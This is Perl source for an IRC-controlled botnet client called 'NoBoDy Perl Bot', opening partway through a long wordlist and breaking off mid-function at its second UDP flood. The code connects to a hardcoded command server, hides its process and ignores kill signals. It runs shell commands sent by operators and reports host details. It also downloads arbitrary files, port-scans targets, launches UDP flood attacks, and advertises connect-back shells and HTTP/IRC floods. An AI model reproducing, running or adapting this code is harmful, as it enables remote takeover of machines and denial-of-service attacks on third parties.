                "raul","raven","ravens","raye","raymond","rayport","reality","reartu","rebecca","red","redcloud",
                "redden","reddog","redfish","redman","redrum","redskins","redwing","redwood","reed","reedquist",
                "reflect","reggae","reggie","reinold","reliant","remak","remember","remote","rendon","rene",
                "renee","renegade","renick","repetto","reptile","republic","rescue","research","resnik",
                "revolution","rex","reynolds","reznor","rger","rhea","rhino","rhjrjlbk","rhonda","ribica","ricardo",
                "richard","richards","richmond","rick","ricky","rielly","rigo","rikuta","rikuxr","riley","rindos",
                "rineer","ripper","ripple","rish","rita","river","rivera","rix","roadrunner","rob","robbie","robby",
                "robert","roberts","robi","robin","robinhood","robinson","robocop","robotech","robotics","roby",
                "rocha","roche","rock","rocket","rockie","rocknroll","rockon","rocky","rodeo","roesler","roger",
                "rogers","roku","roland","rolex","roman","rommel","ronald","ronaldo","ronen","roni","ronwrl","rookie",
                "rootbeer","rose","rosebud","roses","rosie","rossigno","roticanai","rouge","route","row","roxy","roy",
                "royal","ru","ruan","ruby","ruderman","ruescher","rufus","rugby","rugger","rugiada","runner",
                "running","rush","russell","rusty","ruth","ruthie","ruthless","ryan","ryu","saalut","sabatello",
                "sabbath","sabina","sabrina","sadie","sadler","safety","safire","sahu","saigon","sailing","sailor",
                "saint","sakura","salasana","sales","sali","sally","salmon","salut","sam","samantha","samiam","sammi",
                "sammie","sammy","sampson","samsam","samson","samuel","sancramirez","sand","sandi","sandra","sandy",
                "sanjose","sanna","santa","sapers","saphire","sapphire","sarah","sarin","sartore","sase","sasha",
                "saskia","sassy","satanins","satin","satori","satta","satterthwaite","saturday","saturn","savage",
                "sawtell","sayied","sbdc","scarecrow","scarlet","scarlett","scarponi","scepan","scharf",
                "scharlemann","scheiner","schiano","schifini","schilling","schmitt","schnapps","school",
                "schossberger","schuman","schutte","schuyler","schwan","schwickrath","schzsh","science","scooby",
                "scoobydoo","scooter","scorpin","scorpio","scorpion","scotch","scott","scottie","scotty","scout",
                "scouts","scovel","scrooge","scruffy","scuba","scudder","sealink","sean","search","seaton","seattle",
                "secret","security","seeber","seeker","segal","sekler","selvage","sen","sennett","seoul","september",
                "serena","sergei","sergey","serpentor","servant","server","service","services","seterdahl","sethi",
                "seven","sex","sexbolek","sexton","sexy","sexyman","seyfert","shadow","shaggy","shaikh","shakis",
                "shalom","shanghai","shankland","shanley","shannon","shanny","shanti","shaolin","shar","shark",
                "sharmm","sharon","shasta","shatrov","shavelson","shawn","shayne","shazam","shea","shearer","sheats",
                "sheba","sheena","sheila","shekel","shelby","shelley","shelly","shelter","shepherd","sheppard",
                "shepstone","sherry","shesko","shia","shibata","shimon","shio","ship","shirley","shit","shithead",
                "shoes","shogun","shorty","shortys","shotgun","shred","sidekick","sidewalk","sidney","sierra",
                "siesto","sigalot","sigini","sigmachi","signa","signal","signature","sil","silver","silverman",
                "silvetti","simba","simon","simple","simsim","sinatra","singer","sinsabaugh","siren","sirilli",
                "sirius","sites","skane","skar","skate","skeeter","skerry","skibum","skidoo","skiing","skill","skip",
                "skipper","skippy","skoda","skru","skull","skunk","sky","skydive","skygun","skyler","skylink",
                "skywalker","slacker","slaktarn","slash","slayer","sleepy","slgon","slick","slider","slip","sloan",
                "slowe","smarties","smashing","smck","smegma","smile","smiles","smiley","smilow","smiths","smitty",
                "smoke","smokey","smurfy","snake","snakes","snapper","snapple","snickers","sniffen","snike","sniper",
                "snodgrass","snoop","snoopdog","snoopgirl","snoopy","snow","snowball","snowflake","snowman",
                "snowski","snuffy","sober","soccer","socolow","sodoma","softball","soleil","solomon","solon",
                "somers","sommariva","sonic","sonics","sonny","sony","sophia","sophie","sopocani","sorabella",
                "sorceress","sorg","sottak","soukup","soule","soultaniansound","souza","space","spacebbl",
                "spacedump","spain","spanier","spanker","spanky","sparks","sparky","sparrow","spartan","spaulding",
                "spazz","special","speedo","speedy","speizer","spence","spencer","sperber","spermboy","sphynx",
                "spicer","spider","spiegelhalter","spike","spiliotis","spinrad","spirtouli","spitfire","spock",
                "sponge","spooky","spoon","sports","spot","spring","sprite","sprocket","spunky","spurs","squash",
                "srk","sss","ssssss","stacey","stalvey","stam","stan","stang","stanley","star","starbuck","stargate",
                "starlight","stars","start","starter","startrek","starwars","stassinopolus","states","station",
                "statlender","stazzz","stealth","steel","steele","steelers","stefani","steiner","stella","steph",
                "stephani","stephanian","stephanie","stephen","stephi","stepniewska","sterling","steve",
                "steven","stevens","stewart","stewart-oaten","stiepock","stillwell","stimpy","sting","stinga",
                "stingray","stinky","stith","stivers","stj","stjf","stmartin","stock","stocks","stockton",
                "stockwell","stolzenberg","stone","stonich","storage","storer","storm","stormy","stott","strange",
                "stranger","strat","strato","strauch","strawberry","streiff","stretch","stringer","strong",
                "stuart","stud","studenica","student","studio","stumpy","stupid","stussy","success","sucker",
                "suckme","sue","suez","sugar","suhoj","sukun","sullivan","sultan","summer","summit","sumner",
                "sumuinen","sun","sunbird","sundance","sunday","sunfire","sunflower","sunny","sunrise","sunset",
                "sunshine","sunsola","suo","super","superfly","superman","superstar","support","supra","surdam",
                "surf","surfer","surfing","susan","susanna","sutera","sutton","suzanne","suzuki","suzy","svearike",
                "sverige","swanson","sweden","sweetie","sweetii","sweeting","sweetlady","sweetpea","sweetser",
                "sweety","sweklopi","swepilot","swim","swimmer","swimming","swindle","switch","switzer","swoosh",
                "swordfish","sydney","sylvia","sylvie","symbol","syncphos","system","szern","tab","tabatha",
                "tacobell","taffy","tagiuri","tai","taiwan","takumura","talaugon","tallaxlc","talon","tamara",
                "tambiah","tammy","tampone","tamtam","tandler","tango","tanner","tanowitz","tanya","tapani","tara",
                "tarabas","targas","target","tarheel","tarzan","tasha","tata","tatano","tatar","tato","tattoo",
                "taurus","taveras","tawn","taylor","tazdevil","tbird","tbone","tcherepnin","teacher","teague",
                "tech","techno","teddy","teddybear","teflon","telecom","temes","temmer","temp","dtimeral","tenney",
                "tennis","tenx","tequila","terence","teresa","terkukur","terminal","tero","terracini","terry",
                "test","tester","testi","testing","testtest","texas","than","thankyou","thavaneswaran","the",
                "theatre","theboss","theend","thefox","thejudge","theking","thelorax","theodos","theresa",
                "thesint","thibault","thisisit","thisted","thomas","thompson","thomsen","thorne","thrasher",
                "throop","thumper","thunder","thunderbird","thursday","thx","tierney","tiffany","tiger","tigers",
                "tigger","tightend","tigre","tika","till","tim","timber","time","timer","timewalk","timmons",
                "timothy","tina","tinker","tinkerbell","tintin","tmhd","tnt","tnxfck","to","toby","today","tofallis",
                "tokyo","tollestrup","tolls","tolman","tom","tomcat","tomford","tomihki","tommy","tony","tool",
                "toomer","tootsie","topcat","topgun","topher","topo","topulos","tornado","toronto","torresi",
                "torske","toshiba","total","toto","tototo","toucan","towler","toye","toyota","tracy","traebert",
                "training","transfer","transit","transport","trapper","trash","travel","travis","tre","treasure",
                "trebor","tree","trees","trek","trenga","trevor","trewin","tricia","tricky","trident","tringali",
                "trish","tristan","triton","triumph","trixie","troiani","trojan","trombone","trophy","trouble",
                "trout","troy","truck","trucker","truman","trumpet","truss","trustme","trustno","tsiatis",
                "tsomides","tsukurov","tuck","tucker","tucson","tudge","tuesday","tukan","tula","tungau","tupac",
                "turano","turbo","turbozzzz","turek","turing","turtle","tuttle","tvrdjava","tweety","twells",
                "twins","tyler","tysn","tzamarias","ullman","ultimate","undead","unicorn","unicron","unique",
                "united","unity","unix","untermeyer","uoff","upsdell","upsilon","uptimer","urban","urdang-brown",
                "ursula","usdan","user","utopia","uzuner","vacation","vacca","vader","vaismi","vajje","val",
                "valberg","valencia","valentin","valentine","valerie","valhalla","vali","valley","valy",
                "vampire","vanallen","vanda","vandenberg","vanessa","vanheeckeren","vanilla","vanzwet","varjo",
                "vasquez","vass","vedder","velasquez","velo","velvet","venice","venne","vento","venus","venusguy",
                "verghese","vermont","vernon","veronica","vertie","vette","viagara","viana","viano","vicious",
                "vicki","vicky","victor","victoria","victory","video","vidxxx","viens","vignola","viking","vikram",
                "villarreal","vincent","violet","violin","viper","virago","virex","virgil","virginia","visa",
                "vision","visual","vitali","viviani","vodafone","voigt","volcano","volley","volvo","vone",
                "vonhoffman","voodoo","vorhaus","vortex","votey","voyager","vrgnie","vuubeibe","waite","waiting",
                "walden","waldo","wales","walker","wallenberg","walleye","wally","walter","wanderer","wanker",
                "warcraft","warlock","warner","warren","warrior","warriors","warrr","warshafsky","wasabboy",
                "wasowska","water","waterloo","watson","waugh","wayne","weasel","webmaster","webster","wedge",
                "weebee","weezer","weighart","weingarten","weinhaus","weissbourd","weissman","welcome",
                "welles","wellu","welsh","wendy","wengret","wescott","wesley","western","wetzel","whale","whately",
                "whatever","wheels","whilton","whiskey","whisky","whit","white","whitla","whitney","whittaker",
                "whocares","whoville","wibble","wichqueen","wiedersheim","wiener","wilbur","wildcat","wilder",
                "wilhelm","wilk","wilkin","wilkinson","will","willgood","william","williams","willie","willow",
                "willstatter","willy","wilma","wilson","win","wind","window","windows","windsurf","wing","winner",
                "winnie","winniethepooh","winny","winona","winston","winter","wisdom","wizard","wknight","wlly",
                "wolf","wolfgang","wolfman","wolk","wolverine","wolves","wombat","wonder","woo","wooden",
                "woodpowell","woodrow","woods","woody","woofwoof","word","world","wow","wp","wrangler","wright",
                "www","xanadu","xanth","xarasou","xavier","xcountry","xfiles","xmen","xtreme","xxx","xyz","xzone",
                "yacono","yakzr","yamaha","yamane","yang","yankee","yankees","yarchuk","yashy","yasin","yates",
                "ybarra","yedidia","yellow","yenyen","yesson","yetiv","ykbug","yoda","yoffe","yogibear",
                "yogiebear","yolanda","yomama","yoo","youksee","young","yu","yukon","yvette","yvonne","yyyy",
                "zachary","zack","zahedi","zai","zangwill","zapata","zaphod","zebra","zebras","zegans","zenith",
                "zephyr","zeppelin","zepplin","zerbini","zeul","zeus","zfstr","zhongguo","ziggy","zigzag","zinj",
                "zizu","zoldak","zoltan","zombie","zoomer","zucconi","zurn","zvezda","zwiers","zwimou","zwisou",
                "zwsiew","zwsiewale","zxc","zzzc");

my $ircname = pam;

## my @rrealname = ("4,1[ Jericho Security Team ]",
##                  "4,1 /!\ Jericho Security Team /!\ ",
##                  "8,1<///8,1///4,1###>",
##                  "2,1---=== 4,1 Jericho Security Team 2,1===---");
## chop (my $realname = $rrealname[rand scalar @rrealname]);

chop (my $realname = $rircname[rand scalar @rircname]);

## my @nickname = ("NoBoDy[U]");
## my $nick =$nickname[rand scalar @nickname];

my $nick = $rircname[rand scalar @rircname];

$server = 'live-signin.com' unless $server;
my $port = '6667';
$server = '66.135.63.194' unless $server;
my $port = '6667';

my $linas_max='10';
my $sleep='5';

my $homedir = "/tmp";
my $version = 'NoBoDy Perl Bot v2.0';

my @admins = ("NoBoDy");
my @hostauth = ("Ard.pe.rug");
my @channels = ("#ro b*2");

my $pacotes = 1;

#################################################################
##### [ Stop Editing if you dont know what are you doing. ] #####
#################################################################

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

use Socket;
use IO::Socket;
use IO::Socket::INET;
use IO::Select;

chdir("$homedir");

$server="$ARGV[0]" if $ARGV[0];
$0="$process"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Can't fork in background: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
    print $IRC_cur_socket "$_[0]\n";
  }
}

sub getstore ($$)
{
  my $url = shift;
  my $file = shift;
  $http_stream_out = 1;
  open(GET_OUTFILE, "> $file");
  %http_loop_check = ();
  _get($url);
  close GET_OUTFILE;
  return $main::http_get_result;
}

sub _get
{
  my $url = shift;
  my $proxy = "";
  grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
  if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
    my $host = $1;
    my $port = $2 || 80;
    my $path = $3;
    $path = "/" unless defined($path);
    return _trivial_http_get($host, $port, $path);
  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
    my $host = $1;
    my $port = $2;
    my $path = $url;
    return _trivial_http_get($host, $port, $path);
  } else {
    return undef;
  }
}


sub _trivial_http_get
{
  my($host, $port, $path) = @_;
  my($AGENT, $VERSION, $p);
  $AGENT = "get-minimal";
  $VERSION = "20000118";
  $path =~ s/ /%20/g;

  require IO::Socket;
  local($^W) = 0;
  my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                   PeerPort => $port,
                                   Proto   => 'tcp',
                                   Timeout  => 60) || return;
  $sock->autoflush;
  my $netloc = $host;
  $netloc .= ":$port" if $port != 80;
  my $request = "GET $path HTTP/1.0\015\012"
              . "Host: $netloc\015\012"
              . "User-Agent: $AGENT/$VERSION/u\015\012";
  $request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
  $request .= "\015\012";
  print $sock $request;

  my $buf = "";
  my $n;
  my $b1 = "";
  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
    if ($b1 eq "") {
      $b1 = $buf;
      $buf =~ s/.+?\015?\012\015?\012//s;
    }
    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = ""; }
  }
  return undef unless defined($n);
  $main::http_get_result = 200;
  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
    $main::http_get_result = $1;
    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/) {
      my $url = $1;
      return undef if $http_loop_check{$url}++;
      return _get($url);
    }
    return undef unless $main::http_get_result =~ /^2/;
  }

  return $buf;
}

sub conectar {
  my $meunick = $_[0];
  my $server_con = $_[1];
  my $port_con = $_[2];
  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$server_con",
  PeerPort=>$port_con) or return(1);
  if (defined($IRC_socket)) {
    $IRC_cur_socket = $IRC_socket;
    $IRC_socket->autoflush(1);
    $sel_cliente->add($IRC_socket);
    $irc_servers{$IRC_cur_socket}{'host'} = "$server_con";
    $irc_servers{$IRC_cur_socket}{'port'} = "$port_con";
    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
    nick("$meunick");
    sendraw("USER $ircname ".$IRC_socket->sockhost." $server_con :$realname");
    sleep 1;
  }
}

my $line_temp;
while( 1 ) {
  while (!(keys(%irc_servers))) { conectar("$nick", "$server", "$port"); }
  delete($irc_servers{''}) if (defined($irc_servers{''}));
  my @ready = $sel_cliente->can_read(0);
  next unless(@ready);
  foreach $fh (@ready) {
    $IRC_cur_socket = $fh;
    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
    $nread = sysread($fh, $msg, 4096);
    if ($nread == 0) {
      $sel_cliente->remove($fh);
      $fh->close;
      delete($irc_servers{$fh});
    }
    @lines = split (/\n/, $msg);
    for(my $c=0; $c<= $#lines; $c++) {
      $line = $lines[$c];
      $line=$line_temp.$line if ($line_temp);
      $line_temp='';
      $line =~ s/\r$//;
      unless ($c == $#lines) {
        parse("$line");
        } else {
        if ($#lines == 0) {
          parse("$line");
          } elsif ($lines[$c] =~ /\r$/) {
          parse("$line");
          } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
          parse("$line"); 
        } else {
        $line_temp = $line;
        }
      }
    }
  }
}

sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
    sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
    if ($args =~ /^\001VERSION\001$/) {
      	 notice("$pn", "".$vers."");
    }
	if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
    if (grep {$_ =~ /^\Q$pn\E$/i } @admins ) {
    if ($onde eq "$meunick"){
    shell("$pn", "$args");
  }
  if ($args =~ /^(\Q$meunick\E|\!u)\s+(.*)/ ) {
    my $natrix = $1;
    my $arg = $2;
    if ($arg =~ /^\!(.*)/) {
      ircase("$pn","$onde","$1");
      } elsif ($arg =~ /^\@(.*)/) {
      $ondep = $onde;
      $ondep = $pn if $onde eq $meunick;
      bfunc("$ondep","$1");
      } else {
      shell("$onde", "$arg");
    }
  }
}
}
}

elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
  if (lc($1) eq lc($meunick)) {
  $meunick=$4;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
  }
  } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
  nick("$meunick-".int rand(9999));
  } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
  $meunick = $2;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
  $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
  foreach my $canal (@channels) {
    sendraw("MODE $nick +x");
    sendraw("JOIN $canal");
    sendraw("PRIVMSG $canal :0,2 [NoBoDy Perl Bot] 9,2Hello Boss, I`m Ready To Serve ... ");
}
}
}

sub bfunc {
my $printl = $_[0];
my $funcarg = $_[1];
  if (my $pid = fork) {
  waitpid($pid, 0);
  } else {
  if (fork) {
  exit;
  } else {
###########################
##### [ Help Module ] #####
###########################

if ($funcarg =~ /^help/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2======================= ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2NoBoDy PerlBot Main Help:  ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2======================= ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2system              ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2version             ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2channel             ");	
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2flood               ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2utils               ");	
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2======================= ");
}
##################################
##### [ SYSTEM INFO Module ] #####
##################################
if ($funcarg =~ /^system/) {
    $uptime=`uptime`;
    $ownd=`pwd`; 
    $id=`id`;
    $uname=`uname -srp`;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2=================== ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2Bot Configuration:  ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2=================== ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2*Server       : 9,2$server ");	
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2*Port         : 9,2$port ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2*Channels     : 9,2@channels ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2*uname -a     : 9,2$uname ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2*uptime       : 9,2$uptime ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2*FakeProcess  : 9,2$process ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2*ProcessPID   : 9,2$$ ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2*ID           : 9,2$id ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2*Own Dir      : 9,2$ownd ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [System] 9,2=================== ");
}
###################################
##### [ VERSION INFO Module ] #####
###################################
if ($funcarg =~ /^version/){
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Version] 9,2================================== ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Version] 9,2Bot Informations:                  ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Version] 9,2================================== ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Version] 9,2*Bot Version : 8$version   ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Version] 9,2*Bot Creator : 8NoBoDy             ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Version] 9,2*Bot Year    : 8 2013 Q2                ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Version] 9,2================================== ");
}
#################################
##### [ FLOOD INFO Module ] #####
#################################
if ($funcarg =~ /^flood/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2========================================= ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2NoBoDy PerlBot Flood Help:                   ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2========================================= ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2udp1 <ip> <port> <time>               ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2udp2 <ip> <packet size> <time>        ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2udp3 <ip> <port> <time>               ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2tcp <ip> <port> <packet size> <time>  ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2http <site> <time>                    ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2ctcpflood <nick>                      ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2msgflood <nick>                       ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2noticeflood <nick>                    ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2========================================= ");
}
###################################
##### [ CHANNEL INFO Module ] #####
###################################
if ($funcarg =~ /^channel/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2============================= ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2NoBoDy PerlBot Channel Help:     ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2============================= ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2join <channel>            ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2part <channel>            ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2rejoin <channel>          ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2op <channel> <nick>       ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2deop <channel> <nick>     ");	
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2voice <channel> <nick>    ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2devoice <channel> <nick>  ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2nick <newnick>            ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2rnick (random nick)       ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2msg <nick>                ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2quit                      ");	
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2die                       ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0!9,2admin (add/del) <nick>    ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2============================= ");
}
#################################
##### [ UTILS INFO Module ] #####
#################################
if ($funcarg =~ /^utils/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2================================================== ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2NoBoDy PerlBot Utils Help:                            ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2================================================== ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2cback <ip> <port>                              ");	
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2download <url+path> <file>                     ");	
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2mail <subject> <sender> <recipient> <message>  ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2dns <ip>                                       ");	
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2port <ip> <port>                               ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u 0@9,2portscan <ip>                                  ");	
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2!u pwd (for example)                               ");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Help] 9,2================================================== ");
}

#########################
##### [ Functions ] #####
#########################
if ($funcarg =~ /^die/) {
    sendraw($IRC_cur_socket, "QUIT :");
    $killd = "kill -9 ".fork;
    system (`$killd`);
}
#########################
if ($funcarg=~ /^port\s+(.*?)\s+(.*)/ ) {
    my $hostip= "$1";
    my $portsc= "$2";
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $portsc, Proto =>'tcp', Timeout => 7);
    if ($scansock) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [PORT] 9,2Connection to 8$hostip9,1:8$portsc 9,1is 8Accepted. ");
    }
    else {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [PORT] 9,2Connection to 8$hostip9,1:8$portsc 9,1is 4Refused. ");
    }
}
#########################
if ($funcarg =~ /^portscan (.*)/) {
  my $hostip="$1";
  my @portas=("1","7","9","14","20","21","22","23","25","53","80","88","110","112","113","137","143","145","222","333","405","443","444","445","512","587","616","666","993","995","1024","1025","1080","1144","1156","1222","1230","1337","1348","1628","1641","1720","1723","1763","1983","1984","1985","1987","1988","1990","1994","2005","2020","2121","2200","2222","2223","2345","2360","2500","2727","3130","3128","3137","3129","3303","3306","3333","3389","4000","4001","4471","4877","5252","5522","5553","5554","5642","5777","5800","5801","5900","5901","6062","6550","6522","6600","6622","6662","6665","6666","6667","6969","7000","7979","8008","8080","8081","8082","8181","8246","8443","8520","8787","8855","8880","8989","9855","9865","9997","9999","10000","10001","10010","10222","11170","11306","11444","12241","12312","14534","14568","15951","17272","19635","19906","19900","20000","21412","21443","21205","22022","30999","31336","31337","32768","33180","35651","36666","37998","41114","41215","44544","45055","45555","45678","51114","51247","51234","55066","55555","65114","65156","65120","65410","65500","65501","65523","65533");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [PortScan] 9,2Scanning for open ports on 8".$1." 9,1started. ");
  foreach my $porta (@portas)  {
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
    if ($scansock) {
      push (@aberta, $porta);
      $scansock->close;
    }
  }
  if (@aberta) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [PortScan] 9,2Open ports found: 8@aberta ");
    } else {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [PortScan] 9,2No open ports found. ");
  }
}
#########################
if ($funcarg =~ /^download\s+(.*)\s+(.*)/) {
    getstore("$1", "$2");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Download] 9,2Downloaded the file: 8$2 9,1from 8$1 ");
}
#########################
if ($funcarg =~ /^dns\s+(.*)/){ 
    my $nsku = $1;
    $mydns = inet_ntoa(inet_aton($nsku));
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [DNS] 9,2Resolved: 8$nsku 9,1to 8$mydns ");
}
#########################
if ($funcarg =~ /^udp1\s+(.*)\s+(\d+)\s+(\d+)/) {
    return unless $pacotes;
    socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
    my $alvo=inet_aton("$1");
    my $porta = "$2";
    my $dtime = "$3";
    my $pacote;
    my $pacotese;
    my $size = 0;
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [UDP-1 DDOS] 9,2Attacking 8".$1." 9,1On Port 8".$porta." 9,1for 8".$dtime." 9,1seconds. ");
    while (($pacota == "1") && ($pacotes == "1")) {
            $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
            $pacote = int(rand(1024-64)+64) ;
            $porta = int(rand 65000) +1 if ($porta == "0");
            send(Tr0x, pack("a$pacote","Tr0x"), 0, pack_sockaddr_in($porta, $alvo));
            }
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [UDP-1 DDOS] 9,2Attack for 8".$1." 9,1finished in 8".$dtime." 9,1seconds9,1. ");
}
#########################
if ($funcarg =~ /^udp2\s+(.*)\s+(\d+)\s+(\d+)/) {
